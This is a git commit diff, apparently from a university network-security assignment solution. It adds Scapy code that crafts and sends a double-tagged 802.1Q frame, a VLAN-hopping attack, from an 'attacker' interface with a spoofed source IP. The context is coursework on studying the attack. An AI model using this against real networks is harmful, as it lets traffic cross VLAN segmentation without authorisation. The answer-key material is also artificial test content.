0a19ad8d6127a7c68cfb74141daf99f5789a3634
Zubair Al-Zubi <a.n.f.al-zubi@student.tudelft.nl>
2025-05-10 16:56:40 +0200

    Refactor double-tagging script to improve packet sending logic and enhance output messages

--- A2/double_tag/solution/double_tag.py
+++ A2/double_tag/solution/double_tag.py
@@ -21,8 +21,22 @@ def main():
     inner_vlan = int(sys.argv[2])
     destination_ip = sys.argv[3]
 
+    ATTACKER_INTERFACE = "eth0"
+    eth_src = get_if_hwaddr(ATTACKER_INTERFACE)
+
     print(
-        f"Sending double-tagged ICMP packet to {destination_ip} via VLANs {outer_vlan}, {inner_vlan}")
+        f"[*] Sending double-tagged ICMP packet to {destination_ip} via VLANs {outer_vlan}, {inner_vlan}")
+
+    packet = (
+        Ether(src=eth_src, dst="ff:ff:ff:ff:ff:ff") /
+        Dot1Q(vlan=outer_vlan) /
+        Dot1Q(vlan=inner_vlan) /
+        IP(dst=destination_ip, src="192.168.120.100") /
+        ICMP()
+    )
+
+    sendp(packet, iface=ATTACKER_INTERFACE, verbose=False)
+    print("[+] Packet sent")
 
 
 if __name__ == "__main__":
